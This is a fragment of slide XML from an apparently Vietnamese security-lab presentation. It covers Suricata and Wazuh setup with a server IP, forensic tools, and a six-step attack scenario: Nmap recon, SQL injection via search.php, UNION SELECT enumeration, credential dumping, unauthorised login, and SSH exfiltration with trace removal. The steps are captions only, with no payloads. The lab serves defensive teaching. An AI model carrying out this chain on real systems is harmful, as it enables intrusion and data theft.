                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="246" name="Google Shape;246;p26"/>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7" name="Google Shape;247;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1060450" y="1339988"/>
            <a:ext cx="90954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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Suricata IDS:</a:t>
            </a:r>
            <a:endParaRPr sz="2100" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="248" name="Google Shape;248;p26" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="495300" y="1311050"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="249" name="Google Shape;249;p26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="371550" y="2202850"/>
            <a:ext cx="4105200" cy="2839800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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Cài rule:</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ sudo apt install suricata -update -y</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ sudo suricata -T</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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Cài đặt wazuh-agent: </a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ Cài đặt: sudo  apt install wazuh-agent</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ Mở: sudo nano /var/ossec/etc/ossec.conf</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>+ Đổi IP: 35.198.230.108 (IP GCP wazuh)</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60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Kiểm tra log: sudo tail /var/log/suricata/eve.json</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="250" name="Google Shape;250;p26"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4476750" y="1840900"/>
            <a:ext cx="6715126" cy="676275"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="251" name="Google Shape;251;p26"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect r="11371"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4476750" y="2860075"/>
            <a:ext cx="6457950" cy="2995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55"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="256" name="Google Shape;256;p27"/>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5.1. Thiết kế và cấu hình: </a:t>
            </a:r>
            <a:endParaRPr sz="3375" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="257" name="Google Shape;257;p27"/>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8" name="Google Shape;258;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1060450" y="1339988"/>
            <a:ext cx="90954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F8FAFC"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Forensic:</a:t>
            </a:r>
            <a:endParaRPr sz="2100" b="1">
              <a:solidFill>
                <a:srgbClr val="F8FAFC"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="259" name="Google Shape;259;p27" descr="image.png"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="495300" y="1311050"/>
            <a:ext cx="476250" cy="381000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="260" name="Google Shape;260;p27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="495300" y="2145700"/>
            <a:ext cx="4105200" cy="2085600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" anchor="t" anchorCtr="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cài đặt bộ công cụ:</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+ wireshark</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+ tcpdump</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>+ curl</a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-311150" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt1"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tạo case để phục vụ điều tra: </a:t>
            </a:r>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" algn="just" rtl="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr sz="1300">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="261" name="Google Shape;261;p27"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4996000" y="1997725"/>
            <a:ext cx="5862500" cy="33656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75"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="276" name="Google Shape;276;p29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="581025" y="3986212"/>
            <a:ext cx="11029950" cy="3810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7" name="Google Shape;277;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="105392" y="4291012"/>
            <a:ext cx="2605500" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>01. Recon</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="278" name="Google Shape;278;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="167431" y="4567237"/>
            <a:ext cx="2481600" cy="387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050" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Quét cổng và dịch vụ bằng Nmap để tìm điểm yếu.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="279" name="Google Shape;279;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1980478" y="2927151"/>
            <a:ext cx="2605500" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>02. SQLi Exploit</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="280" name="Google Shape;280;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2042517" y="3203376"/>
            <a:ext cx="2481600" cy="387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050" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Chèn payload qua trang search.php để vượt qua xác thực.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="281" name="Google Shape;281;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3855563" y="4291012"/>
            <a:ext cx="2605500" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>03. DB Enum</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="282" name="Google Shape;282;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3917602" y="4567237"/>
            <a:ext cx="2481600" cy="387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050" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Dùng UNION SELECT để trích xuất cấu trúc Database.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="283" name="Google Shape;283;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5730649" y="2927151"/>
            <a:ext cx="2605500" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>04. Dump Creds</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="284" name="Google Shape;284;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5792688" y="3203376"/>
            <a:ext cx="2481600" cy="387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050" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Đánh cắp username/password từ bảng người dùng.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="285" name="Google Shape;285;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7605734" y="4291012"/>
            <a:ext cx="2605500" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>05. Admin Login</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="286" name="Google Shape;286;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7667773" y="4567237"/>
            <a:ext cx="2481600" cy="387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050" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Sử dụng tài khoản bị lộ để đăng nhập trái phép.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="287" name="Google Shape;287;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9480820" y="2927151"/>
            <a:ext cx="2605500" cy="23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rgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>06. Exfiltration</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="288" name="Google Shape;288;p29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9542859" y="3203376"/>
            <a:ext cx="2481600" cy="387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050" i="0" u="none" strike="noStrike" cap="none">
                <a:solidFill>
                  <a:srgbClr val="CBD5E1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
                <a:ea typeface="Times New Roman"/>
                <a:cs typeface="Times New Roman"/>
                <a:sym typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Dump Database ra file, chuyển qua SSH và xóa dấu vết.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:latin typeface="Times New Roman"/>
              <a:ea typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
              <a:sym typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
